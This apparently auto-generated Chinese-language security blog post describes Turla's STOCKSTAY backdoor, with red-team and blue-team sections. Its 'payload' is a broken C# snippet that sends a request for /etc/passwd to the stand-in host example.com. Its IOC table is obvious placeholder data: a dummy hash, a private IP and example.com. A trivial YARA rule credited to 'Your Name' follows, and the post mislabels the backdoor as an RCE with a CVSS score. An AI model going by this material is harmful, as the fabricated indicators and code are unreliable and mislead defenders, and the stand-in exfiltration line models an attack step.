---
layout: post
title:  "Google Details Turla's New STOCKSTAY Backdoor Used in Ukraine Espionage Attacks"
date:   2026-06-26 08:53:35 +0000
categories: [security]
severity: high
---

# 🔥 解析 Turla 的 STOCKSTAY 後門：技術分析與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: .NET, WebSocket, Inter-Process Communication (IPC)

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: STOCKSTAY 是一種多元件後門，使用 .NET 和 Windows Forms 框架，通過 WebSocket 連接與命令和控制 (C2) 伺服器進行通信。其使用開源的 websocket-sharp 庫實現安全的 WebSocket 連接。
* **攻擊流程圖解**:
  1. STOCKSTAY.MARKETMAKER 下載器元件下載和執行其他三個模組。
  2. STOCKSTAY.STOCKBROKER 代理-aware 隧道元件建立安全的 WebSocket 連接到遠程伺服器。
  3. STOCKSTAY.STOCKTRADER 主要後門元件啟用信息收集。
  4. STOCKSTAY.STOCKMARKET 管理元件解析後門配置並設定執行選項。
* **受影響元件**: .NET Framework 4.5 或以上版本，Windows 7 或以上版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 需要有初步的系統訪問權限。
* **Payload 建構邏輯**:

    ```
    
    csharp
    using System;
    using System.Net;
    using System.Net.WebSockets;
    
    class STOCKSTAY
    {
        static void Main(string[] args)
        {
            // 建立 WebSocket 連接
            var ws = new ClientWebSocket();
            ws.ConnectAsync(new Uri("wss://example.com"), CancellationToken.None).Wait();
            
            // 發送命令
            var command = "Get /etc/passwd";
            var buffer = Encoding.UTF8.GetBytes(command);
            ws.SendAsync(new ArraySegment<byte>(buffer), WebSocketMessageType.Text, true, CancellationToken.None).Wait();
        }
    }
    
    ```
* **繞過技術**: 可以使用 WebSocket 連接繞過傳統的防火牆和入侵檢測系統。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | C:\Windows\Temp\STOCKSTAY.exe |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule STOCKSTAY_Detection
    {
        meta:
            description = "Detects STOCKSTAY malware"
            author = "Your Name"
        strings:
            $a = "STOCKSTAY" ascii
            $b = "websocket-sharp" ascii
        condition:
            all of them
    }
    
    ```
* **緩解措施**: 更新系統和應用程序到最新版本，使用防火牆和入侵檢測系統，監控系統日誌和網絡流量。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **WebSocket**: 一種實時的雙向通信協議，允許客戶端和伺服器之間進行全雙工通信。
* **Inter-Process Communication (IPC)**: 一種允許不同進程之間進行通信的機制，常用於實現進程間的資料交換和同步。
* **.NET Framework**: 一種由 Microsoft 開發的軟件框架，提供了一系列的庫和工具，用于開發 Windows 應用程序。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/06/google-details-turlas-new-stockstay.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


